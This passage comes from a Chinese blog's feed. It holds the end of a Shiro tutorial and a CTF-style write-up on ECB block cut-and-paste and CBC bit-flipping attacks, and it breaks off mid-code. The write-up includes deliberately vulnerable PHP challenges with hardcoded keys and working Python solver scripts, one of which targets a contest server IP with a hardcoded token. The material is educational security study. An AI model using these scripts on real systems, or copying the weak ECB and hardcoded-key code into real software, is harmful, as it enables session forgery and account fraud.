customRealm.setCredentialsMatcher(matcher);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//提交主题认证请求</span></span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject=SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken usernamePasswordToken=<span class="keyword">new</span> UsernamePasswordToken(<span class="string">"admin"</span>,<span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">        subject.login(usernamePasswordToken);</span><br><span class="line">        System.out.println(<span class="string">"isAuthenticated is:"</span> +subject.isAuthenticated());</span><br><span class="line">        subject.checkRole(<span class="string">"admin"</span>);</span><br><span class="line">        subject.checkPermissions(<span class="string">"user:delete"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Shiro集成Spring"><a href="#Shiro集成Spring" class="headerlink" title="Shiro集成Spring"></a>Shiro集成Spring</h1><h2 id="Shiro过滤器"><a href="#Shiro过滤器" class="headerlink" title="Shiro过滤器"></a>Shiro过滤器</h2><p><img src="../../images/java/shirolearning/4.jpg" alt=""><br><img src="../../images/java/shirolearning/5.jpg" alt=""></p><h1 id="Shiro-会话管理"><a href="#Shiro-会话管理" class="headerlink" title="Shiro 会话管理"></a>Shiro 会话管理</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;shiro学习&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>常见的-WEB-密码学攻击</title>
    <link href="https://blog.cfyqy.com/article/10fa8c14.html"/>
    <id>https://blog.cfyqy.com/article/10fa8c14.html</id>
    <published>2021-02-19T16:15:53.000Z</published>
    <updated>2021-02-24T09:56:19.099Z</updated>
    
    <content type="html"><![CDATA[<p>常见的 WEB 密码学攻击</p><a id="more"></a><h1 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h1><p>ECB模式的全称是Electronic CodeBook模式，将明文分组加密后直接成为密文分组，而密文则是由密文分组直接拼接而成。 </p><p>因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果，如图所示（翻转密文分组，那么明文分组也会被翻转）</p><p><strong>例题1：</strong><br>某个 CTF 题目：</p><p> ecb.php 源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php7</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AES</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $privateKey = <span class="string">"12345678123456781234567812345678"</span>;</span><br><span class="line">    $encrypted=openssl_encrypt($data,<span class="string">'AES-128-ECB'</span>,$privateKey,OPENSSL_RAW_DATA);</span><br><span class="line">    <span class="comment">#$encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateKey, $data, MCRYPT_MODE_ECB);</span></span><br><span class="line">    $encryptedData = (base64_encode($encrypted));</span><br><span class="line">    <span class="keyword">return</span> $encryptedData;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DE__AES</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $privateKey = <span class="string">"12345678123456781234567812345678"</span>;</span><br><span class="line">    $encryptedData = base64_decode($data);</span><br><span class="line">   $decrypted=openssl_decrypt($encryptedData,<span class="string">'AES-128-ECB'</span>,$privateKey,OPENSSL_RAW_DATA);</span><br><span class="line">    $decrypted = rtrim($decrypted, <span class="string">""</span>) ;</span><br><span class="line">    <span class="keyword">return</span> $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'a'</span>]==<span class="string">'reg'</span>)&#123;</span><br><span class="line">    setcookie(<span class="string">'uid'</span>, AES(<span class="string">'9'</span>));</span><br><span class="line">    setcookie(<span class="string">'username'</span>, AES($_POST[<span class="string">'username'</span>]));</span><br><span class="line">    header(<span class="string">"Location: http://127.0.0.1/ecb.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@!<span class="keyword">isset</span>($_COOKIE[<span class="string">'uid'</span>])||@!<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form method="post" action="ecb.php?a=reg"&gt;</span></span><br><span class="line"><span class="string">Username:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text"  name="username"&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">Password:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" name="password" &gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="submit" value="注册"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt; '</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $uid = DE__AES($_COOKIE[<span class="string">'uid'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( $uid != <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'uid:'</span> .$uid .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hi '</span> . DE__AES($_COOKIE[<span class="string">'username'</span>]) .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are not administrotor!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Hi you are administrotor!!"</span> .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Flag is flag&#123;this is flag&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解题思路：<br>以administrator权限登陆就就能获得Flag。判断权限则是根据cookie里面的uid参数，cookie包含username和uid两个参数，均为使用ECB加密的密文，然而username的密文是根据注册时的明文生成的</p><p>因此我们可以根据username的明文操纵生成我们想要的uid的密文。经过fuzz发现明文分组块为16个字节，那么我们注册17字节的用户，多出的那一个字节就可以是我们我们希望的UID的值，而此时我们查看username的密文增加部分就是UID的密文，即可伪造UID。</p><p>注册aaaaaaaaaaaaaaaa1获得1的密文分组,注册aaaaaaaaaaaaaaaa2获得2的密文分组，以此类推<br>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//python2</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> cookielib</span><br><span class="line"><span class="keyword">import</span> Cookie</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    reg_url=<span class="string">'http://127.0.0.1/ecb.php?a=reg'</span></span><br><span class="line">    index_url=<span class="string">'http://127.0.0.1/ecb.php'</span></span><br><span class="line">    cookie=cookielib.CookieJar()</span><br><span class="line">    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))</span><br><span class="line">    opener.addheaders.append((<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0'</span>))</span><br><span class="line">    num=str(num)</span><br><span class="line">    values=&#123;<span class="string">'username'</span>:<span class="string">'aaaaaaaaaaaaaaaa'</span>+num,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">    data=urllib.urlencode(values)</span><br><span class="line">    opener.open(reg_url,data)</span><br><span class="line">    text=opener.open(index_url,data)</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie:</span><br><span class="line">        <span class="keyword">if</span> ck.name==<span class="string">'username'</span>:</span><br><span class="line">            user_name=ck.value</span><br><span class="line">    user_name = urllib.unquote(user_name)</span><br><span class="line">    user_name = base64.b64decode(user_name)</span><br><span class="line">    hex_name = user_name.encode(<span class="string">'hex'</span>)</span><br><span class="line">    hex_name = hex_name[len(hex_name)/<span class="number">2</span>:]</span><br><span class="line">    hex_name = hex_name.decode(<span class="string">'hex'</span>)</span><br><span class="line">    uid = base64.b64encode(hex_name)</span><br><span class="line">    uid = urllib.quote(uid)</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie:</span><br><span class="line">        <span class="keyword">if</span> ck.name==<span class="string">'uid'</span>:</span><br><span class="line">            ck.value=uid</span><br><span class="line">    text=opener.open(index_url).read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Flag'</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">print</span> text</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">print</span> num</span><br></pre></td></tr></table></figure><p><strong>例题2：</strong><br>startCTF 2021 lottery again<br>ecb模式，按块加密，每块密钥相同，密文按块直接与明文对应，所以我们可以控制明密文对重放攻击。</p><p>对于一个enc，长106字节，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"lottery"</span>:<span class="string">"48e51545-cfd3-4d2e-8ea4-851c945b5faf"</span>,<span class="string">"user"</span>:<span class="string">"0123ff93-c230-49b9-b078-5d205247c5a8"</span>,<span class="string">"coin"</span>:81&#125;</span><br></pre></td></tr></table></figure><p>本题使用的是MCRYPT_RIJNDAEL_256加密，rijndael128与aes相同，都是以128位为一个块加密，rijndael256则是以256位为一个块，即32字节。</p><p>思路就是通过重放，将多个彩票不同块进行拼接，使得同一个user可以对应多个lottery。</p><p>因为每块是32字节对应切割位点如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"lottery"</span>:<span class="string">"48e51545-cfd3-4d2e-8|ea4-851c945b5faf"</span>,<span class="string">"user"</span>:<span class="string">"0123ff|93-c230-49b9-b078-5d205247c5a8"</span>,|<span class="string">"coin"</span>:81&#125;</span><br></pre></td></tr></table></figure><p>最后一块不足32字节自动填充。</p><p>可以看到我们无论替换哪一个块都不能完整控制lottery或者user，替换前两块的成功的前提是另一个enc的user前6字节也是0123ff，碰撞概率较小。</p><p>但是我们可以将第一个enc的前1，2块拼接上第二个enc的2，3，4块，形成如下类似的格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"lottery"</span>:<span class="string">"48e51545-cfd3-4d2e-8ea4-851c945b5faf"</span>,<span class="string">"user"</span>:<span class="string">"0123ffb0e-b15c9de5afaa"</span>,<span class="string">"user"</span>:<span class="string">"8dfd276a-ee65-4563-af33-c1ae7c577322"</span>,<span class="string">"coin"</span>:88&#125;</span><br></pre></td></tr></table></figure><p>当json_decode之后后面的user会覆盖前面的，就成功控制user不变，lottery一直在变了。</p><p>脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">user_token = <span class="string">"1slT9Xb1TxoDtEtxKZ2k0n8c9T3lZttY"</span></span><br><span class="line">user_uuid = <span class="string">"fadf5f40-9fe1-4a57-8d5b-06f16584298b"</span></span><br><span class="line">user_enc = b<span class="string">"8mKK4YdL0VHw67+rtMCBv+z9SX4yB7SwYWlL2A3VPqXXFHIpf1XGIVDHNxW5td/3fyYbEEEBv43419eYjQAwd9thL1nc+6OWy2UDfXdG+INLgbXDkV8kaRNGurSbXtf5XUzAgdeXmksz508IscL5BqiGkpqPuH/4Qa5qAiM0/hU="</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">"api_token"</span>: user_token</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://52.149.144.45:8080"</span></span><br><span class="line">def get_random():</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, 10))</span><br><span class="line">def register():</span><br><span class="line">    username=get_random()</span><br><span class="line">    data= &#123;</span><br><span class="line">            <span class="string">"username"</span>: username,</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"asdasd"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url + <span class="string">"/user/register"</span>,data=data)</span><br><span class="line">    d = json.loads(res.text)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">return</span> username</span><br><span class="line">def login(username, password=<span class="string">"asdasd"</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: username,</span><br><span class="line">        <span class="string">"password"</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url + <span class="string">"/user/login"</span>,data=data)</span><br><span class="line">    d = json.loads(res.text)</span><br><span class="line">    <span class="built_in">return</span> d[<span class="string">'user'</span>][<span class="string">'api_token'</span>]</span><br><span class="line">def info(api_token):</span><br><span class="line">    res = requests.get(url + <span class="string">"/user/info?api_token="</span> + api_token)</span><br><span class="line">    d = json.loads(res.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'uuid: '</span>+d[<span class="string">'user'</span>][<span class="string">'uuid'</span>])</span><br><span class="line">def buy(api_key):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"api_token"</span>: api_key</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url + <span class="string">"/lottery/buy"</span>,data=data)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    d = json.loads(res.text)</span><br><span class="line">    <span class="built_in">return</span> d[<span class="string">'enc'</span>]</span><br><span class="line">def get_enc(enc):</span><br><span class="line">    o = base64.b64decode(enc)</span><br><span class="line">    u = base64.b64decode(user_enc)</span><br><span class="line">    m = base64.b64encode(o[:64] + u[32:])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'enc: '</span>, end=<span class="string">''</span>)</span><br><span class="line">    <span class="built_in">print</span>(quote(m))</span><br><span class="line">    <span class="built_in">return</span> m</span><br><span class="line">def charge(enc):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"user"</span>: user_uuid,</span><br><span class="line">        <span class="string">"enc"</span>: enc,</span><br><span class="line">        <span class="string">"coin"</span>: <span class="string">"7"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url + <span class="string">"/lottery/charge"</span>, data=data, cookies=cookie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"charge: "</span>, end=<span class="string">''</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.content)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        username = register()</span><br><span class="line">        api_token = login(username)</span><br><span class="line">        enc = buy(api_token)</span><br><span class="line">        info(api_token)</span><br><span class="line">        mo_enc = get_enc(enc)</span><br><span class="line">        charge(mo_enc)</span><br></pre></td></tr></table></figure><h1 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h1><h2 id="字节翻转"><a href="#字节翻转" class="headerlink" title="字节翻转"></a>字节翻转</h2><p>因为CBC模式是将前一个密文分组和明文分组进行混合加密所以，是可以避免ECB模式的弱点。</p><p>但正因为如此，导致了解密时修改前一个密文分组就可以操纵后一个的解密后的明文分组，可以将前一个密文中的任意比特进行修改（0,1进行互换，也可以叫翻转）</p><p>因此CBC模式有两个攻击点：  </p><ul><li>①iv向量，影响第一个明文分组   </li><li>②第n个密文分组，影响第n+1个明文分组   </li></ul><p>密文通过block cipher encryption解密，得到中间密文，中间密文与IV(前一个密文区块)异或后得到的是明文，因此可以通过攻击IV，来改变最终的明文。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">条件：中间密文 ^ 原先IV = 原始明文</span><br><span class="line"></span><br><span class="line">假设：伪造IV = 原始IV ^ 原始明文 ^ 伪造明文</span><br><span class="line"></span><br><span class="line">此时： 中间密文 ^ 伪造IV=原始IV ^ 原始明文 ^ 伪造IV =原始IV ^ 原始明文^原始IV ^ 原始明文 ^ 伪造明文=伪造明文</span><br><span class="line"></span><br><span class="line">所以：中间密文 ^ 伪造IV = 伪造明文</span><br><span class="line">通过篡改IV，来改变密文解密之后的明文</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line">密文1[4]的意思是密文1字符串第4个字节，相当于数组下标。</span><br><span class="line">设：密文1[4] = A，解密(密文2)[4] = B，明文2[4] = C</span><br><span class="line">因为A ^ B = C，根据结论有B = A ^ C</span><br><span class="line">当人为修改A=A ^ C时，那么A ^ B = A ^ C ^ B = B ^ B = 0，这样明文2[4]的结果就为0了</span><br><span class="line">当人为修改A=A ^ C ^ x (x为任意数值)时，那么</span><br><span class="line">A ^ B = A ^ C ^ x ^ B = B ^ B ^ x = x，这是明文2[4] = x，这样就达到了控制明文某个字节的目的了。</span><br></pre></td></tr></table></figure><p><strong>例题1：</strong><br>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = <span class="string">"8bd54bcfe6a23fc0"</span>;</span><br><span class="line">$flag = <span class="string">"flag&#123;admin_or_guest&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>cbc.php   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">$iv = <span class="string">'NGY0MWVlOGE2MGU4NTkxMQ=='</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str,$key,$iv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($str),<span class="string">"AES-128-CBC"</span>,$key,OPENSSL_RAW_DATA,base64_decode($iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str,$key,$iv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($str,<span class="string">"AES-128-CBC"</span>,$key,OPENSSL_RAW_DATA, base64_decode($iv)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(decode($_COOKIE[<span class="string">'username'</span>],$key,$_COOKIE[<span class="string">'iv'</span>]) === <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello admin&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $flag.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(decode($_COOKIE[<span class="string">'username'</span>],$key,$_COOKIE[<span class="string">'iv'</span>]) === <span class="string">"guest"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello guest&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"iv or username error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $enc = encode(<span class="string">"guest"</span>,$key,$iv);</span><br><span class="line">    setcookie(<span class="string">'username'</span>,$enc);</span><br><span class="line">    setcookie(<span class="string">'iv'</span>,$iv);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以知道代码解密得到的用户名为 admin 时，会得到flag。</p><p>所以可以利用CBC字节翻转攻击，将密文解密成任意明文。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">iv = base64.b64decode(<span class="string">'NGY0MWVlOGE2MGU4NTkxMQ=='</span>)</span><br><span class="line">admin = <span class="string">'admin'</span> + <span class="string">'\x0b'</span>*<span class="number">11</span></span><br><span class="line">guest = <span class="string">'guest'</span> + <span class="string">'\x0b'</span>*<span class="number">11</span></span><br><span class="line">new_iv = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(admin)):</span><br><span class="line">    new_iv += chr(ord(iv[i]) ^ ord(admin[i]) ^ ord(guest[i]))</span><br><span class="line"><span class="keyword">print</span> base64.b64encode(new_iv)</span><br><span class="line"><span class="comment"># Mnc8K39lOGE2MGU4NTkxMQ==</span></span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web/1.jpg" alt=""></p><p><strong>例题2：</strong><br>Bugku 的 web39 CBC字节翻转攻击 </p><p>存在.index.php.swp ,vim -r .index.php.swp 恢复得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">"static/css/style.css"</span> rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span 